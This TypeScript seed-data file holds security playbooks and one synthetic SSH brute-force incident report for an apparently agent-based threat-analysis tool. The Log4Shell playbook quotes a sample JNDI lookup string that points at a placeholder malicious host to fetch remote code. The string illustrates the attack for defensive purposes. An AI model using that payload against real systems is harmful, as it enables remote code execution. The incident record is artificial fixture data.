import { RagDocument, ThreatReport } from './types';

export const initialRagDocuments: RagDocument[] = [
  {
    id: 'rag-1',
    title: 'Linux SSH Brute-Force Response Playbook',
    category: 'network',
    content: 'Standard operating procedure for responding to Linux SSH brute-force attacks. 1. Identify source IP address initiating login requests. 2. Verify if authentication was successful. 3. If unsuccessful attempts exceed 10 in 5 minutes, block the source IP immediately at the firewall layer or via Fail2ban. 4. Force login password rotate or transition exclusively to public-private keypairs. 5. Scan compromised systems for SSH backdoor files such as malicious SSH authorized_keys entries.',
    tags: ['ssh', 'bruteforce', 'mitigation', 'firewall']
  },
  {
    id: 'rag-2',
    title: 'SQL Injection Remediation Policy (CVE-2024-SQLi)',
    category: 'exploit',
    content: 'Vulnerability remediation policy for SQL Injection (SQLi) attempts. SQL Injection arises when user inputs are concatenated directly into sql query strings. 1. Enforce Parameterized Queries or Prepared Statements across all relational databases. 2. Apply input validation schemas using strict regex filters (allowlist patterns only). 3. Ensure database execution roles use Least Privilege principles (e.g., read-only access for reporting accounts, no database schema modification rights). 4. Deploy web application firewalls (WAF) with OWASP Core Rule Sets enabled.',
    tags: ['sqli', 'owasp', 'cve', 'db-security']
  },
  {
    id: 'rag-3',
    title: 'IAM Least Privilege Security Standard',
    category: 'iam',
    content: 'Enterprise standard for Identity and Access Management (IAM). 1. Multi-Factor Authentication (MFA) is strictly required for all administrative roles and cloud console entries. 2. Stale or inactive access keys exceeding 90 days must be auto-disabled. 3. IAM policies should never yield wildcards `*` on resource types or operational scopes unless fully audited and isolated. 4. Implement temporary credentials for CI/CD runners using OpenID Connect (OIDC) instead of prolonged secret keys.',
    tags: ['iam', 'mfa', 'access-control', 'cred-rotation']
  },
  {
    id: 'rag-4',
    title: 'WannaCry and EternalBlue Ransomware Profile',
    category: 'malware',
    content: 'Malware profile detailing the WannaCry worm, which exploits EternalBlue (MS17-010) SMB vulnerability. EternalBlue triggers arbitrary code execution on systems running SMBv1. Standard mitigations: 1. Completely disable SMBv1 across the network environment. 2. Ensure MS17-010 patch is applied to all Windows Server endpoints. 3. Block port 445 on internet-facing network security groups to restrict SMB traversing.',
    tags: ['ransomware', 'smb', 'windows', 'eternalblue']
  },
  {
    id: 'rag-5',
    title: 'Log4Shell (CVE-2021-44228) Response Blueprint',
    category: 'exploit',
    content: 'Technical mitigation guidelines for Apache Log4j JNDI remote code execution. Attackers exploit JNDI lookups in header log strings (e.g. ${jndi:ldap://malicious.com/a}) to trigger unauthorized code download. 1. Upgrade Log4j references to v2.17.1 or higher. 2. Disable message lookup matching by appending -Dlog4j2.formatMsgNoLookups=true to Java application runtime configurations. 3. Block outbound LDAP (port 389) and RMI (port 1099) ports from backend computational clusters.',
    tags: ['log4shell', 'log4j', 'rce', 'ldap']
  }
];

export const initialThreatReports: ThreatReport[] = [
  {
    id: 'threat-1',
    timestamp: new Date(Date.now() - 3600000 * 2).toISOString(), // 2 hours ago
    rawText: 'Security log incident: Connection request on port 22 from suspicious IP address 198.51.100.42. System reported 45 consecutive failed login attempts for user root in less than 3 minutes. Internal host mailserver-prod was targeted.',
    source: 'AuthLog Sentry',
    status: 'completed',
    matchedDocs: [
      { doc: initialRagDocuments[0], score: 0.85 }
    ],
    analysis: {
      severity: 'HIGH',
      confidence: 0.95,
      indicatorsOfCompromise: ['198.51.100.42', 'ssh-port-22'],
      vulnerabilitiesMatched: ['SSH Brute Force Attack'],
      recommendedMitigation: 'Add a firewall rule to block traffic from IP 198.51.100.42 immediately. Transition SSH daemon access keys exclusively to public-private keypairs and deploy Fail2ban.',
      mitigationSteps: [
        'Run `iptables -A INPUT -s 198.51.100.42 -j DROP` to seal firewall.',
        'Inspect `/var/log/auth.log` on mailserver-prod to ensure no successful login records.',
        'Configure public key credentials and disable PasswordAuthentication in /etc/ssh/sshd_config.'
      ]
    },
    summary: {
      executiveSummary: 'The AuthLog system flagset identified high-frequency brute-force login attempts targeting port 22 of the production mailserver server from an unauthorized remote IP. Immediate isolation and remediation are recommended.',
      technicalDetails: 'A remote adversary initiated 45 unauthenticated connection attempts targeting the ROOT user on mailserver-prod on 198.51.100.42. Standard firewall playbooks have been triggered.',
      keyRisks: [
        'Credential stuffing risk due to weak passwords',
        'Unauthorized command shell execution if credentials got compromised',
        'Computational exhaustion on SSH backend threads'
      ]
    },
    alert: {
      title: 'CRITICAL ALERT: SSH Brute Force on mailserver-prod',
      channel: 'Slack',
      priority: 'P2',
      payload: {
        event_time: new Date(Date.now() - 3600000 * 2).toISOString(),
        host: 'mailserver-prod',
        attacker_ip: '198.51.100.42',
        alert_source: 'Multi-Agent Router'
      },
      messageText: '🚨 Action Required: SSH Brute-Force attack detected on mailserver-prod! Attacker IP 198.51.100.42 has caused 45 failures. Firewall block is being enacted.'
    },
    evaluation: {
      accuracyScore: 9,
      relevanceScore: 10,
      faithfulnessScore: 9,
      criticism: 'Excellent. The agents utilized the SSH playbook recommendations accurately and retrieved target mitigation codes.',
      details: 'Evaluators verified that firewall blocking mechanisms (iptables) match enterprise security standard RAG playbooks. All extracted metrics match context raw logs.'
    }
  }
];
